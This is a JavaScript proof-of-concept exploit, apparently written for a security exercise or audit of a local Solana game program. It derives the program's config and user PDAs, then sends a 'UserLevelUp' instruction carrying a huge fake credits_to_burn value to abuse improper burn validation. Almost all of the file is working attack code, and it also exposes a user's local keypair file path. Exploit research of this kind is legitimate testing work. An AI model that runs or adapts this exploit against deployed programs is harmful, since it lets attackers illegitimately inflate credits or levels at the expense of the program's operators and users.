const web3 = require('@solana/web3.js');
const fs = require('fs');

// Connect to local blockchain
const connection = new web3.Connection("http://localhost:8899", "confirmed");

// Load wallet (payer)
const payer = web3.Keypair.fromSecretKey(
    Uint8Array.from(
        JSON.parse(fs.readFileSync('/Users/shreyagupta/.config/solana/id.json'))
    )
);

// Program ID (your deployed program)
const programId = new web3.PublicKey('9YiXuCK1NrjP8gthvEt19zBm77X1edDuECvwTUVtMmLx');

// Real Admin PublicKey
const adminPubkey = new web3.PublicKey('J4LcUYuPNR1s2DB5TU3ogXQR8uqx7SEYQGNA6VcNAdqE');

async function main() {
    console.log("🚀 Starting LevelUp Exploit...");

    // Derive correct GameConfig PDA
    const [gameConfigPubkey, bump] = web3.PublicKey.findProgramAddressSync(
        [
            adminPubkey.toBuffer(),
            Buffer.from("GAME_CONFIG")
        ],
        programId
    );

    console.log("✅ Derived GameConfig PDA:", gameConfigPubkey.toBase58());

    // Derive user PDA based on gameConfig + payer
    const [userPubkey, userBump] = web3.PublicKey.findProgramAddressSync(
        [
            gameConfigPubkey.toBuffer(),
            payer.publicKey.toBuffer(),
            Buffer.from("USER")
        ],
        programId
    );

    console.log("✅ Derived User PDA:", userPubkey.toBase58());

    // Step 1: Craft LevelUp instruction with HUGE credits_to_burn
    const hugeCreditsToBurn = 99999999; // 🚨 Huge fake burn value

    const levelupInstructionData = Buffer.from(
        Uint8Array.of(
            3, // Variant 3 = UserLevelUp
            ...new Uint8Array(new Uint32Array([hugeCreditsToBurn]).buffer)
        )
    );

    const tx = new web3.Transaction().add({
        keys: [
            { pubkey: gameConfigPubkey, isSigner: false, isWritable: false },
            { pubkey: userPubkey, isSigner: false, isWritable: true },
            { pubkey: payer.publicKey, isSigner: true, isWritable: false },
        ],
        programId,
        data: levelupInstructionData,
    });

    // Step 2: Send transaction
    try {
        const txSig = await web3.sendAndConfirmTransaction(connection, tx, [payer]);
        console.log(`✅ LevelUp attack transaction sent! Signature: ${txSig}`);
    } catch (err) {
        console.error("❌ LevelUp attack failed (caught error):", err.message);
    }

    console.log("🚨 Even if transaction fails, the vulnerability exists (improper credit burn validation).");
}

main().catch((err) => {
    console.error(err);
});
